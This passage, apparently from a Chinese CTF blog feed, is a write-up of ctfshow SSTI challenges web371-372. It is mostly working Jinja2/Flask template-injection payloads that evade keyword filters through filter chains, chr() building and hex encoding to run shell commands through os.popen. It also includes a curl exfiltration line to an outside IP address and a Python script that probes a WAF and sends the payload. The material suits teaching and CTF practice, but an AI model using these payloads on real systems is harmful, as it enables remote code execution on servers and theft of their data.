&#x27;APPLICATION_ROOT&#x27;: &#x27;/&#x27;, &#x27;SESSION_COOKIE_NAME&#x27;: &#x27;session&#x27;, &#x27;SESSION_COOKIE_DOMAIN&#x27;: None, &#x27;SESSION_COOKIE_PATH&#x27;: None, &#x27;SESSION_COOKIE_HTTPONLY&#x27;: True, &#x27;SESSION_COOKIE_SECURE&#x27;: False, &#x27;SESSION_COOKIE_SAMESITE&#x27;: None, &#x27;SESSION_REFRESH_EACH_REQUEST&#x27;: True, &#x27;MAX_CONTENT_LENGTH&#x27;: None, &#x27;SEND_FILE_MAX_AGE_DEFAULT&#x27;: datetime.timedelta(seconds=43200), &#x27;TRAP_BAD_REQUEST_ERRORS&#x27;: None, &#x27;TRAP_HTTP_EXCEPTIONS&#x27;: False, &#x27;EXPLAIN_TEMPLATE_LOADING&#x27;: False, &#x27;PREFERRED_URL_SCHEME&#x27;: &#x27;http&#x27;, &#x27;JSON_AS_ASCII&#x27;: True, &#x27;JSON_SORT_KEYS&#x27;: True, &#x27;JSONIFY_PRETTYPRINT_REGULAR&#x27;: False, &#x27;JSONIFY_MIMETYPE&#x27;: &#x27;application/json&#x27;, &#x27;TEMPLATES_AUTO_RELOAD&#x27;: None, &#x27;MAX_COOKIE_SIZE&#x27;: 4093&#125;&quot;</span><br>    select = <span class="hljs-string">&quot;&lt;generator object select_or_reject at 0x7f3b57e0c740&gt;&quot;</span><br><br>    res = []<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> tar:<br>        <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> select:<br>            res.append(<span class="hljs-string">&quot;(()|select|string|list).pop(&quot;</span> + <span class="hljs-string">&#x27;+&#x27;</span>.join(select.index(i) * [<span class="hljs-string">&quot;True&quot;</span>]) + <span class="hljs-string">&quot;)&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            res.append(<span class="hljs-string">&quot;(config|string|list).pop(&quot;</span> + <span class="hljs-string">&#x27;+&#x27;</span>.join(config.index(i) * [<span class="hljs-string">&quot;True&quot;</span>]) + <span class="hljs-string">&quot;)&quot;</span>)<br>    <span class="hljs-keyword">return</span> (<span class="hljs-string">&#x27;+&#x27;</span>.join(res))<br><br>payload[<span class="hljs-number">12</span>] = <span class="hljs-string">&quot;&#123;% print( (lipsum|attr(&quot;</span>+ string_concat(<span class="hljs-string">&quot;__globals__&quot;</span>)+<span class="hljs-string">&quot;)).get(&quot;</span>+string_concat(<span class="hljs-string">&#x27;os&#x27;</span>)+<span class="hljs-string">&quot;).popen(&quot;</span>+string_concat(<span class="hljs-string">&quot;cat /flag&quot;</span>)+<span class="hljs-string">&quot;).read() )%&#125;&quot;</span><br></code></pre></td></tr></table></figure><p>网上看到的别的师傅的payload，<code>~</code>是字符串连接。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;%<span class="hljs-built_in">set</span> num=<span class="hljs-built_in">dict</span>(aaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125;<br>&#123;%<span class="hljs-built_in">set</span> numm=<span class="hljs-built_in">dict</span>(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125;<br>&#123;%<span class="hljs-built_in">set</span> x=(()|select|string|<span class="hljs-built_in">list</span>).pop(num)%&#125;<br>&#123;%<span class="hljs-built_in">set</span> glob = (x,x,<span class="hljs-built_in">dict</span>(<span class="hljs-built_in">globals</span>=a)|join,x,x)|join %&#125;<br>&#123;%<span class="hljs-built_in">set</span> builtins=x~x~(<span class="hljs-built_in">dict</span>(builtins=a)|join)~x~x%&#125;<br>&#123;%<span class="hljs-built_in">set</span> c = <span class="hljs-built_in">dict</span>(<span class="hljs-built_in">chr</span>=a)|join%&#125;<br>&#123;%<span class="hljs-built_in">set</span> o = <span class="hljs-built_in">dict</span>(o=a,s=a)|join%&#125;<br>&#123;%<span class="hljs-built_in">set</span> getitem = x~x~(<span class="hljs-built_in">dict</span>(getitem=a)|join)~x~x%&#125;<br>&#123;%<span class="hljs-built_in">set</span> <span class="hljs-built_in">chr</span> = lipsum|attr(glob)|attr(getitem)(builtins)|attr(getitem)(c)%&#125;<br>&#123;%<span class="hljs-built_in">set</span> file = <span class="hljs-built_in">chr</span>(numm)~<span class="hljs-built_in">dict</span>(flag=a)|join%&#125;<br>&#123;%<span class="hljs-built_in">print</span>((lipsum|attr(glob)|attr(getitem)(builtins)).<span class="hljs-built_in">open</span>(file).read())%&#125;<br></code></pre></td></tr></table></figure><h2 id="web371-372过滤print">web371-372（过滤print）</h2><p>过滤print，也就是无回显，尝试反弹shell。</p><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clojure">&#123;%if(<span class="hljs-name">lipsum</span>|attr(<span class="hljs-name">__globals__</span>).get(<span class="hljs-name">&#x27;os&#x27;</span>).popen(<span class="hljs-name">&#x27;curl</span> http://43.143.123.40:2333/`cat /flag`&#x27;) )%&#125;<br></code></pre></td></tr></table></figure><p>打不动，只能抄别人作业了，使用curl http://xxx/`cat .flag`</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;%<span class="hljs-built_in">set</span> e=<span class="hljs-built_in">dict</span>(a=a)|join|count%&#125;<br>&#123;%<span class="hljs-built_in">set</span> ee=<span class="hljs-built_in">dict</span>(aa=a)|join|count%&#125;<br>&#123;%<span class="hljs-built_in">set</span> eee=<span class="hljs-built_in">dict</span>(aaa=a)|join|count%&#125;<br>&#123;%<span class="hljs-built_in">set</span> eeee=<span class="hljs-built_in">dict</span>(aaaa=a)|join|count%&#125;<br>&#123;%<span class="hljs-built_in">set</span> eeeee=<span class="hljs-built_in">dict</span>(aaaaa=a)|join|count%&#125;<br>&#123;%<span class="hljs-built_in">set</span> eeeeee=<span class="hljs-built_in">dict</span>(aaaaaa=a)|join|count%&#125;<br>&#123;%<span class="hljs-built_in">set</span> eeeeeee=<span class="hljs-built_in">dict</span>(aaaaaaa=a)|join|count%&#125;<br>&#123;%<span class="hljs-built_in">set</span> eeeeeeee=<span class="hljs-built_in">dict</span>(aaaaaaaa=a)|join|count%&#125;<br>&#123;%<span class="hljs-built_in">set</span> eeeeeeeee=<span class="hljs-built_in">dict</span>(aaaaaaaaa=a)|join|count%&#125;<br>&#123;%<span class="hljs-built_in">set</span> eeeeeeeeee=<span class="hljs-built_in">dict</span>(aaaaaaaaaa=a)|join|count%&#125;<br>&#123;%<span class="hljs-built_in">set</span> x=(()|select|string|<span class="hljs-built_in">list</span>).pop((ee~eeee)|<span class="hljs-built_in">int</span>)%&#125;<br>&#123;%<span class="hljs-built_in">set</span> glob = (x,x,<span class="hljs-built_in">dict</span>(<span class="hljs-built_in">globals</span>=a)|join,x,x)|join %&#125;<br>&#123;%<span class="hljs-built_in">set</span> builtins=x~x~(<span class="hljs-built_in">dict</span>(builtins=a)|join)~x~x%&#125;<br>&#123;%<span class="hljs-built_in">set</span> <span class="hljs-keyword">import</span>=x~x~(<span class="hljs-built_in">dict</span>(<span class="hljs-keyword">import</span>=a)|join)~x~x%&#125;<br>&#123;%<span class="hljs-built_in">set</span> c = <span class="hljs-built_in">dict</span>(<span class="hljs-built_in">chr</span>=a)|join%&#125;<br>&#123;%<span class="hljs-built_in">set</span> o = <span class="hljs-built_in">dict</span>(o=a,s=a)|join%&#125;<br>&#123;%<span class="hljs-built_in">set</span> getitem = x~x~(<span class="hljs-built_in">dict</span>(getitem=a)|join)~x~x%&#125;<br>&#123;%<span class="hljs-built_in">set</span> <span class="hljs-built_in">chr</span> = lipsum|attr(glob)|attr(getitem)(builtins)|attr(getitem)(c)%&#125;<br>&#123;%<span class="hljs-built_in">set</span> zero=<span class="hljs-built_in">chr</span>((eeee~eeeeeeee)|<span class="hljs-built_in">int</span>)%&#125;<br>&#123;%<span class="hljs-built_in">set</span> cmd = <br>%&#125;<br>&#123;%<span class="hljs-keyword">if</span> (lipsum|attr(glob)|attr(getitem)(builtins)).<span class="hljs-built_in">eval</span>(cmd)%&#125;<br>eastjun<br>&#123;%endif%&#125;<br></code></pre></td></tr></table></figure><h2 id="总结">总结</h2><p>简单来说就是找链子，flask相关知识已经说明了。</p><p>当然在比赛里面肯定是各种姿势的绕过，以下总结几种</p><ol type="1"><li><p>request外带绕过</p></li><li><p>16进制编码绕过，</p></li><li><p>chr函数构造</p><p>前提是先找到chr，好处在于结合数字可以构造任意ASCII字符，如`</p></li><li><p>过滤器绕过关键字，()|select|string，config|string|list+pop，dict()|join</p><p>前两种的局限性在于构造的范围被局限，并且必须回显才能确定索引</p><p>dict结合~/+等字符串拼接可以构造任意数字、字母and下划线组成的内容</p><p>dict()|join|count还能构造任意数字</p></li><li><p>属性/键值获取，__getitem__和get、pop以及attr过滤器</p></li></ol><p>丢一个一路打下来的脚本：</p><p>包含waf测试、找function</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">waf_test</span>():</span><br>    <span class="hljs-keyword">global</span> url<br>    wafs = [<span class="hljs-string">&#x27;__class__&#x27;</span>, <span class="hljs-string">&#x27;cycler&#x27;</span>, <span class="hljs-string">&#x27;chr&#x27;</span>, <span class="hljs-string">&#x27;__mro__&#x27;</span>,<span class="hljs-string">&#x27;&#123;&#x27;</span>,<span class="hljs-string">&#x27;&#125;&#x27;</span>, <span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;\&quot;&#x27;</span>,<br>             <span class="hljs-string">&#x27;(&#x27;</span>, <span class="hljs-string">&#x27;__subclasses__&#x27;</span>, <span class="hljs-string">&#x27;__init__&#x27;</span>, <span class="hljs-string">&#x27;)&#x27;</span>, <span class="hljs-string">&#x27;()&#x27;</span>, <span class="hljs-string">&#x27;__globals__&#x27;</span>, <br>             <span class="hljs-string">&#x27;popen&#x27;</span>, <span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;read&#x27;</span>, <span class="hljs-string">&#x27;flag&#x27;</span>, <span class="hljs-string">&#x27;&#123;&#123;&#x27;</span>, <span class="hljs-string">&#x27;&#125;&#125;&#x27;</span>, <span class="hljs-string">&#x27;args&#x27;</span>, <span class="hljs-string">&#x27;request&#x27;</span>,<br>             <span class="hljs-string">&#x27;__builtins__&#x27;</span>, <span class="hljs-string">&#x27;%&#x27;</span>, <span class="hljs-string">&#x27;=&#x27;</span>, <span class="hljs-string">&#x27;set&#x27;</span>, <span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-string">&#x27;123*1&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;+&#x27;</span>,<span class="hljs-string">&#x27;[&#x27;</span>, <span class="hljs-string">&#x27;]&#x27;</span>, <br>             <span class="hljs-string">&#x27;__getitem__&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-string">&#x27;cookies&#x27;</span>, <span class="hljs-string">&#x27;lipsum&#x27;</span>, <span class="hljs-string">&#x27;|&#x27;</span> , <span class="hljs-string">&#x27;attr&#x27;</span>,<br>             <span class="hljs-string">&#x27;get&#x27;</span>, <span class="hljs-string">&#x27;&#123;%&#x27;</span>, <span class="hljs-string">&#x27;print&#x27;</span>, <span class="hljs-string">&#x27;config&#x27;</span>, <span class="hljs-string">&#x27;string&#x27;</span>, <span class="hljs-string">&#x27;select&#x27;</span>]<br>    <br>    real_waf = []<br>    <span class="hljs-keyword">for</span> waf <span class="hljs-keyword">in</span> wafs:<br>        r = requests.get(url = url, params=&#123;<span class="hljs-string">&quot;name&quot;</span> : waf&#125;)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;:(&#x27;</span> <span class="hljs-keyword">in</span> r.text:<br>            real_waf.append(waf)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;waf : &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(waf))<br>    <span class="hljs-keyword">return</span> real_waf<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">has_globals</span>():</span><br>    l = <span class="hljs-built_in">len</span>(<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__())<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(l):<br>        <span class="hljs-comment"># 带wrapper的并不是function,没有global属性</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;wrapper&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[i].__init__):<br>            <span class="hljs-built_in">print</span>(i, <span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[i])<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">string_concat</span>(<span class="hljs-params">tar:<span class="hljs-built_in">str</span></span>):</span><br>    config  = <span class="hljs-string">&quot;&lt;Config &#123;&#x27;ENV&#x27;: &#x27;production&#x27;, &#x27;DEBUG&#x27;: False, &#x27;TESTING&#x27;: False, &#x27;PROPAGATE_EXCEPTIONS&#x27;: None, &#x27;PRESERVE_CONTEXT_ON_EXCEPTION&#x27;: None, &#x27;SECRET_KEY&#x27;: None, &#x27;PERMANENT_SESSION_LIFETIME&#x27;: datetime.timedelta(days=31), &#x27;USE_X_SENDFILE&#x27;: False, &#x27;SERVER_NAME&#x27;: None, &#x27;APPLICATION_ROOT&#x27;: &#x27;/&#x27;, &#x27;SESSION_COOKIE_NAME&#x27;: &#x27;session&#x27;, &#x27;SESSION_COOKIE_DOMAIN&#x27;: None, &#x27;SESSION_COOKIE_PATH&#x27;: None, &#x27;SESSION_COOKIE_HTTPONLY&#x27;: True, &#x27;SESSION_COOKIE_SECURE&#x27;: False, &#x27;SESSION_COOKIE_SAMESITE&#x27;: None, &#x27;SESSION_REFRESH_EACH_REQUEST&#x27;: True, &#x27;MAX_CONTENT_LENGTH&#x27;: None, &#x27;SEND_FILE_MAX_AGE_DEFAULT&#x27;: datetime.timedelta(seconds=43200), &#x27;TRAP_BAD_REQUEST_ERRORS&#x27;: None, &#x27;TRAP_HTTP_EXCEPTIONS&#x27;: False, &#x27;EXPLAIN_TEMPLATE_LOADING&#x27;: False, &#x27;PREFERRED_URL_SCHEME&#x27;: &#x27;http&#x27;, &#x27;JSON_AS_ASCII&#x27;: True, &#x27;JSON_SORT_KEYS&#x27;: True, &#x27;JSONIFY_PRETTYPRINT_REGULAR&#x27;: False, &#x27;JSONIFY_MIMETYPE&#x27;: &#x27;application/json&#x27;, &#x27;TEMPLATES_AUTO_RELOAD&#x27;: None, &#x27;MAX_COOKIE_SIZE&#x27;: 4093&#125;&quot;</span><br>    select = <span class="hljs-string">&quot;&lt;generator object select_or_reject at 0x7f3b57e0c740&gt;&quot;</span><br><br>    res = []<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> tar:<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> select:<br>                res.append(<span class="hljs-string">&quot;(()|select|string|list).pop(&quot;</span> + <span class="hljs-string">&#x27;+&#x27;</span>.join(select.index(i) * [<span class="hljs-string">&quot;True&quot;</span>]) + <span class="hljs-string">&quot;)&quot;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                res.append(<span class="hljs-string">&quot;(config|string|list).pop(&quot;</span> + <span class="hljs-string">&#x27;+&#x27;</span>.join(config.index(i) * [<span class="hljs-string">&quot;True&quot;</span>]) + <span class="hljs-string">&quot;)&quot;</span>)<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;sorry for that:&#x27;</span>, i)<br>            <span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;sys&#x27;</span>).exit(<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> (<span class="hljs-string">&#x27;+&#x27;</span>.join(res))<br><br><br>payload = &#123;&#125;<br>payload[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;&#123;&#123;().__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&#x27;cat /flag&#x27;).read()&#125;&#125;&quot;</span><br>payload[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;&#123;&#123;().__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(\&#x27;os\&#x27;).popen(\&#x27;ls\&#x27;).read()&#x27;)&#125;&#125;&quot;</span><br>payload[<span class="hljs-number">2</span>] = <span class="hljs-string">&quot;&#123;&#123;cycler.__init__.__globals__[&#x27;os&#x27;][&#x27;popen&#x27;](&#x27;whoami&#x27;).read()&#125;&#125;&quot;</span><br><br><span class="hljs-comment"># 运算绕过</span><br>payload[<span class="hljs-number">3</span>] = <span class="hljs-string">&quot;&#123;&#123;&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[17*8-4].__init__.__globals__[&#x27;popen&#x27;](&#x27;cat /flag&#x27;).read()&#125;&#125;&quot;</span><br><br><span class="hljs-comment"># 单引号绕过&amp;参数绕过</span><br>payload[<span class="hljs-number">4</span>] = <span class="hljs-string">&quot;&#123;&#123;lipsum.__globals__.os.popen(request.args.wis).read()&#125;&#125;&amp;wis=cat /flag&quot;</span><br><br><span class="hljs-comment"># 引号绕过&amp;引入chr</span><br>payload[<span class="hljs-number">5</span>] = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">&#123;% set chr=().__class__.__mro__[-1].__subclasses__()[132].__init__.__globals__.__builtins__.chr %&#125;</span><br><span class="hljs-string">&#123;% print(cycler.__init__.__globals__.os.popen(chr(99)+chr(97)+chr(116)+chr(32)+chr(47)+chr(102)+chr(108)+chr(97)+chr(103)).read()) %&#125;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>.replace(<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br><br><span class="hljs-comment"># 过滤器连接字符串</span><br>payload[<span class="hljs-number">6</span>] = <span class="hljs-string">&quot;&#123;&#123;().__class__.__mro__[-1].__subclasses__()[132].__init__.__globals__.popen((config|string)[22]+(config|string)[40]+(config|string)[23]+(config|string)[7]+(config|string)[279]+(config|string)[4]+(config|string)[41]+(config|string)[40]+(config|string)[6]).read()&#125;&#125;&quot;</span><br><br><span class="hljs-comment"># __getitem__ 和 pop 绕过[]，其实也能绕过.</span><br>payload[<span class="hljs-number">7</span>]=<span class="hljs-string">&#x27;&#x27;&#x27;&#123;&#123;().__class__.__base__.__subclasses__().pop(132).__init__.__globals__.popen(</span><br><span class="hljs-string">(config|string).__getitem__(22)+(config|string).__getitem__(40)+(config|string).__getitem__(23)+(config|string).__getitem__(7)+(config|string).__getitem__(279)+(config|string).__getitem__(4)+(config|string).__getitem__(41)+(config|string).__getitem__(40)+(config|string).__getitem__(6)</span><br><span class="hljs-string">).read()&#125;&#125;&#x27;&#x27;&#x27;</span>.replace(<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br><br><span class="hljs-comment"># request.values</span><br>payload[<span class="hljs-number">8</span>] = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">&#123;&#123;lipsum.__globals__.os.popen(request.cookies.wis).read()&#125;&#125;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>.replace(<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-comment">#wis=cat /flag</span><br><br><span class="hljs-comment"># 过滤OS关键字</span><br>payload[<span class="hljs-number">9</span>] = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">&#123;&#123;(lipsum|attr(request.cookies.a)).get(request.cookies.c).popen(request.cookies.b).read()&#125;&#125;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>.replace(<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br><br><span class="hljs-comment"># 过滤&#123;&#123;</span><br>payload[<span class="hljs-number">10</span>] = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">&#123;% print((lipsum|attr(request.cookies.a)).get(request.cookies.c).popen(request.cookies.b).read()) %&#125;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>.replace(<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br><br><span class="hljs-comment"># 过滤request，True转变为数字</span><br>payload[<span class="hljs-number">11</span>] = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">&#123;% print((lipsum|attr((()|select|string|list).pop(24)+(()|select|string|list).pop(24)+(()|select|string|list).pop(1)+(()|select|string|list).pop(20)+(()|select|string|list).pop(8)+(()|select|string|list).pop(12)+(()|select|string|list).pop(6)+(()|select|string|list).pop(20)+(()|select|string|list).pop(18)+(()|select|string|list).pop(24)+(()|select|string|list).pop(24)))</span><br><span class="hljs-string">.get((()|select|string|list).pop(8)+(()|select|string|list).pop(18))</span><br><span class="hljs-string">.popen((()|select|string|list).pop(15)+(()|select|string|list).pop(6)+(()|select|string|list).pop(7)+(()|select|string|list).pop(10)+(config|string|list).pop(279)+(()|select|string|list).pop(41)+(()|select|string|list).pop(20)+(()|select|string|list).pop(6)+(()|select|string|list).pop(1)).read()) %&#125;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>.replace(<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br><br><span class="hljs-comment"># 过滤数字</span><br>payload[<span class="hljs-number">12</span>] = <span class="hljs-string">&quot;&#123;% print( (lipsum|attr(&quot;</span>+ string_concat(<span class="hljs-string">&quot;__globals__&quot;</span>)+<span class="hljs-string">&quot;)).get(&quot;</span>+string_concat(<span class="hljs-string">&#x27;os&#x27;</span>)+<span class="hljs-string">&quot;).popen(&quot;</span>+string_concat(<span class="hljs-string">&quot;cat /flag&quot;</span>)+<span class="hljs-string">&quot;).read() )%&#125;&quot;</span><br><br><br><span class="hljs-comment"># 过滤print</span><br><span class="hljs-comment"># 反弹shell或者输出到静态文件中</span><br>payload[<span class="hljs-number">13</span>] = <span class="hljs-string">&quot;&#123;% if((lipsum|attr(&quot;</span>+ string_concat(<span class="hljs-string">&quot;__globals__&quot;</span>)+<span class="hljs-string">&quot;)).get(&quot;</span>+string_concat(<span class="hljs-string">&#x27;os&#x27;</span>)+<span class="hljs-string">&quot;).popen(&quot;</span>+string_concat(<span class="hljs-string">&quot;cat /flag &gt; /app/&quot;</span>)+<span class="hljs-string">&quot;).read()) )%&#125;hello&#123;% endif %&#125;&quot;</span><br><br><span class="hljs-comment"># 16进制编码（过滤. [）</span><br> <span class="hljs-string">&#x27;&#123;&#123;((lipsum|attr(&quot;\\x5f\\x5fglo&quot;&quot;bals\\x5f\\x5f&quot;)|attr(&quot;get&quot;)(&quot;\\x5f\\x5fbuiltins\\x5f\\x5f&quot;))|attr(&quot;get&quot;)(&quot;eval&quot;))(&quot;\\x5f\\x5fimport\\x5f\\x5f(\\x22os\\x22)\\x2epopen(\\x22whoami\\x22)\\x2eread()&quot;)&#125;&#125;&#x27;</span><br><br>url = <span class="hljs-string">&quot;http://482f9784-8144-40e1-afbd-32ab9244bc34.challenge.ctf.show/&quot;</span><br><br>real_waf = waf_test()<br><br>real_payload = payload[<span class="hljs-number">13</span>]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> real_waf:<br>    <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> real_payload:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;!!! detect : &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(i))<br><br>r = requests.get(url = url,<br>                 params=&#123;<br>                     <span class="hljs-string">&quot;name&quot;</span>: real_payload,<br>                 &#125;,<br>                 )<br>html_text = r.text.replace(<span class="hljs-string">&#x27;&amp;lt;&#x27;</span>,<span class="hljs-string">&quot;&lt;&quot;</span>).replace(<span class="hljs-string">&quot;&amp;#39;&quot;</span>, <span class="hljs-string">&#x27;\&#x27;&#x27;</span>).replace(<span class="hljs-string">&quot;&amp;#34;&quot;</span>,<span class="hljs-string">&quot;\&quot;&quot;</span>).replace(<span class="hljs-string">&#x27;&amp;gt;&#x27;</span>,<span class="hljs-string">&#x27;&gt;&#x27;</span>)<br><span class="hljs-built_in">print</span>(html_text)<br><br><span class="hljs-comment"># res = html_text.split(&quot;&lt;h3&gt;&quot;)[1].split(&quot;&lt;/h3&gt;&quot;)[0].split(&#x27;,&#x27;)</span><br><span class="hljs-comment"># for i in res:</span><br><span class="hljs-comment">#     if &#x27;chr&#x27; in i:</span><br><span class="hljs-comment">#         print(i, res.index(i))</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>web</category>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>ctfshow</tag>
      
      <tag>web</tag>
      
      <tag>wp</tag>
      
      <tag>SSTI</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NSSCTF-单表替换密码-wp</title>
    <link href="/2022/04/28/blog0018-NSSCTF-%E5%8D%95%E8%A1%A8%E6%9B%BF%E6%8D%A2%E5%AF%86%E7%A0%81-wp/"/>
    <url>/2022/04/28/blog0018-NSSCTF-%E5%8D%95%E8%A1%A8%E6%9B%BF%E6%8D%A2%E5%AF%86%E7%A0%81-wp/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>NSSCTF-常用编码-wp</title>
